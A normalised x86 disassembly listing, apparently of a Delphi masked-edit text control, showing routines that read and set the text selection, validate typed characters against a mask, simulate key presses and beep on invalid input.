mov ebx eax
mov eax ebx
call sub_46def4
test al al
jne r-xdata
mov eax ebx
call sub_432038
mov dx 0x2e
mov eax ebx
call sub_46e938
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_46de0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dee6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46deed
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
call sub_429728
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_429728
lea edx [ ebp - 0x4 ]
call sub_429370
call sub_429728
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46e0cc
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dbdc
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_46f3f0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46db74
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46f488
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46db74
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46e114
sub_46df04
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46dfb9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46dbdc
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_46ed04
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_4040c8
mov eax esi
call sub_404334
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_46d258
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_46d0dc
mov [ ebx + 0x22c ] al
mov eax esi
call sub_46d160
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ecbc
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_40410c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46db74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46dfc0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404098
retn
sub_46dfc8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_404480
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_46df04
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46e0cc
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_431ea4
mov eax ebx
call sub_46def4
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_46db74
mov eax ebx
call sub_4448fc
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_4445f8
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_431ea4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_46e114
sub_46e09c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46def4
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_431ea4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_431ea4
pop esi
pop ebx
retn
sub_46e0cc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_46e0f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_46e114
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e374
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_46def4
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_46dbdc
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40bff0
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_46dbdc
mov eax [ ebp - 0x218 ]
call sub_404334
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_46dbdc
mov eax [ ebp - 0x210 ]
call sub_404334
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46e0f0
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_46dbdc
mov eax [ ebp - 0x21c ]
call sub_404334
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_46dbdc
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46e0f0
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e37b
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_404098
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_46e2e2
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_46e384
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46def4
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_46e0cc
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_46e114
sub_46e3d0
push ebx
mov ebx eax
mov eax ebx
call sub_431ed4
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_46db74
xor edx edx
mov eax ebx
call sub_431f0c
sub_46e3f8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46e5bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e5c4
lea eax [ ebp - 0x10 ]
call sub_404074
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46e0cc
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_46e938
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46e80c
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46e114
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_46eed8
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_4445f8
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_40425c
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402ba0
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402b70
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_4042d8
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46e0f0
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_404534
push eax
push 0x0
push 0xc2
mov eax esi
call sub_4445f8
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_46e0cc
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46e7b8
sub_46e5d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e7aa
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e7b1
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404098
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e0cc
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e7f0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46dbdc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e0f0
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_46dbdc
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e114
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_46e114
jmp r-xdata
dec [ ebx + 0x230 ]
cmp si 0x25
jne r-xdata
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov ecx eax
mov edx eax
mov eax ebx
call sub_46e0f0
dec [ ebx + 0x230 ]
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e7b8
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e7b8
jmp r-xdata
mov ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e7b8
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46e7f0
jmp r-xdata
sub_46e7b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea ebx [ ecx + edi ]
mov edx ebx
mov eax esi
call sub_46e80c
mov ebx eax
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46d308
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_46e114
pop edi
pop esi
pop ebx
retn
mov ebx edi
sub_46e80c
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
cmp ebx [ esi + 0x228 ]
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46d308
test al al
jne r-xdata
inc ebx
sub_46e834
push ebx
push esi
mov esi eax
mov ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x220 ]
call sub_46d308
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_46e80c
mov ebx eax
dec ebx
sub_46e868
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] cl
mov esi edx
mov ebx eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_46e0cc
cmp si 0x24
jne r-xdata
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x1
je r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_46e114
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_46e114
mov eax [ esp + 0x4 ]
cmp eax [ ebx + 0x230 ]
je r-xdata
mov ecx [ ebx + 0x228 ]
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_46e0f0
mov eax ebx
call sub_46e384
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp + 0x8 ]
xor edx edx
mov eax ebx
call sub_46e0f0
mov eax ebx
call sub_46e384
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
cmp eax [ esp + 0x8 ]
je r-xdata
mov eax [ ebx + 0x228 ]
mov [ ebx + 0x230 ] eax
mov eax [ esp + 0x8 ]
dec eax
mov [ esp + 0x4 ] eax
xor eax eax
mov [ ebx + 0x230 ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
inc eax
mov [ esp + 0x8 ] eax
sub_46e938
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
lea edi [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46ea44
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x20e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ea4b
lea eax [ ebp - 0xc ]
call sub_404074
retn
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46e0cc
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jg r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
jl r-xdata
cmp si 0x8
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46dbdc
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
push eax
lea edx [ ebp - 0xc ]
mov ecx [ edi ]
mov eax ebx
call sub_46f3f0
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
sub ecx [ edi ]
mov edx [ edi ]
inc edx
mov eax [ ebp - 0xc ]
call sub_404594
mov eax [ ebp - 0xc ]
call sub_404534
push eax
push 0x0
push 0xc2
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
sub eax [ edi ]
dec eax
je r-xdata
mov esi [ edi ]
mov edx [ edi ]
mov eax ebx
call sub_46e7f0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46e0cc
cmp esi [ edi ]
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_46e0cc
mov edx [ edi ]
dec edx
mov eax ebx
call sub_46e114
mov edx [ edi ]
mov eax ebx
call sub_46e80c
mov [ edi ] eax
mov edx [ edi ]
mov eax ebx
call sub_46e114
jmp r-xdata
sub_46ea54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ead7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_432590
test [ ebx + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x22d ] 0x2
jne r-xdata
and [ ebx + 0x22d ] 0xfd
mov eax ebx
call sub_46e384
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46dbdc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x238 ]
call sub_4040c8
mov edx esi
mov eax ebx
call sub_432590
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eade
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_46eae4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_46eb65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4325cc
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_46dbdc
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x238 ]
call sub_4040c8
mov eax ebx
call sub_4448fc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eb6c
lea eax [ ebp - 0xc ]
call sub_404074
retn
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e0cc
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46e80c
cmp eax [ ebp - 0x4 ]
je r-xdata
mov edx eax
mov eax ebx
call sub_46e114
sub_46eb74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x4 ] 0x1b
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov eax ebx
call sub_431ed4
test al al
je r-xdata
mov [ esi + 0xc ] 0x1
sub_46ebac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46def4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443a20
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov eax ebx
call sub_46e384
sub_46ebe0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46ec72
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46dbdc
mov eax esi
call sub_46def4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec79
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax esi
call sub_431ed4
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
test al al
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_46e114
mov eax esi
mov edx [ eax ]
call [ edx + 0xf4 ]
or [ esi + 0x22d ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_46ec80
push ebx
add esp 0xfffffff8
mov ebx eax
push 0x0
call MessageBeep
mov eax [ ebx + 0x220 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
pop ecx
pop edx
pop ebx
retn
sub_46ecbc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push edi
mov cl [ ebx + 0x224 ]
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46cec0
push edi
mov cl 0x20
mov edx esi
mov eax [ ebx + 0x220 ]
call sub_46cec0
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46ed04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46eeca
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov eax esi
mov edx ebx
call sub_4040c8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_404334
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx 0x1
call sub_46ce24
mov ebx eax
test bl 0x1
je r-xdata
mov edi 0x1
mov eax [ esi ]
call sub_404334
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ esi ]
call sub_404334
mov ebx eax
test ebx ebx
jle r-xdata
mov al [ ebp - 0xd ]
add al 0xfc
sub al 0x2
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ esi ]
call sub_404334
mov ecx eax
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
inc edx
mov eax [ esi ]
call sub_404594
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0xc ]
dec ecx
mov eax [ esi ]
mov edx 0x1
call sub_404594
mov edx [ ebp - 0x18 ]
mov eax esi
pop ecx
call sub_404380
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x224 ] 0x20
je r-xdata
mov edi 0x1
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov edi 0x1
inc edi
dec ebx
jne r-xdata
inc [ ebp - 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eed1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404098
retn
mov eax [ esi ]
call sub_404334
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ esi ]
call sub_404334
mov edx eax
dec edx
mov eax esi
call sub_4046c0
inc edi
dec ebx
jne r-xdata
push esi
mov eax [ esi ]
call sub_404334
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ esi ]
mov edx [ ebp - 0xc ]
call sub_404594
jmp r-xdata
inc [ ebp - 0xc ]
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx edi
call sub_46ccd0
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
dec eax
sub al 0x2
jae r-xdata
mov edi 0x1
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ esi ]
mov al [ edx + eax ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov eax esi
call j_sub_404540#2
mov [ eax + edi - 0x1 ] 0x20
inc edi
dec ebx
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi - 0x1 ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x224 ]
jne r-xdata
sub_46eed8
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebp edx
mov esi eax
mov bl 0x1
cmp [ esi + 0x220 ] 0x0
je r-xdata
test bl bl
jne r-xdata
xor ebx ebx
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46d2ac
mov edi eax
test edi edi
jl r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
push 0x0
call MessageBeep
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46ccd0
mov [ esp ] al
mov al [ ebp ]
mov [ esp + 0x1 ] al
mov edx ebp
mov ecx edi
mov eax esi
call sub_46f06c
mov ebx eax
test bl bl
jne r-xdata
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
mov cl [ esp + 0x1 ]
mov edx edi
mov eax esi
call sub_46f74c
mov edi eax
test edi edi
jle r-xdata
mov edx edi
mov eax [ esi + 0x220 ]
call sub_46d258
mov edi eax
mov edx edi
mov eax esi
call sub_46e114
jmp r-xdata
sub_46ef8c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
xor eax eax
push ebp
push sub_46f05a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_46d258
mov ebx eax
mov eax [ esi ]
mov eax [ eax + 0x220 ]
call sub_404334
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
jle r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ esi ]
mov edx [ edx + 0x220 ]
mov al [ edx + eax - 0x1 ]
call sub_402a54
push eax
